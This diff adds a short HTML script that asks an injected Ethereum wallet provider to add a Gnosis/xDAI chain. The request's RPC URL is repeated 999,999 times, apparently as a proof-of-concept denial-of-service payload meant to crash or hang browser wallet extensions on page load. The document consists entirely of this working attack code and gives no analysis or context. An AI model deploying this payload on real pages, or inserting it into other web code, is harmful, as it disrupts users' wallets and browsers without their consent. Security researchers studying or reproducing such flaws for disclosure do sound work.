@@ -1,0 +1,27 @@
+load
+<script>
+    window.ethereum.request({
+      "method": "wallet_addEthereumChain",
+      "params": [
+        {
+          "chainId": "0x64",
+          "chainName": "Gnosis",
+          "rpcUrls": [
+               "https://blockscout.com/poa/xdai/".repeat(999999)
+          ],
+          "iconUrls": [
+            "https://xdaichain.com/fake/example/url/xdai.svg",
+            "https://xdaichain.com/fake/example/url/xdai.png"
+          ],
+          "nativeCurrency": {
+            "name": "xDAI",
+            "symbol": "xDAI",
+            "decimals": 18
+          },
+          "blockExplorerUrls": [
+            "https://blockscout.com/poa/xdai/"
+          ]
+        }
+      ]
+    });
+</script>
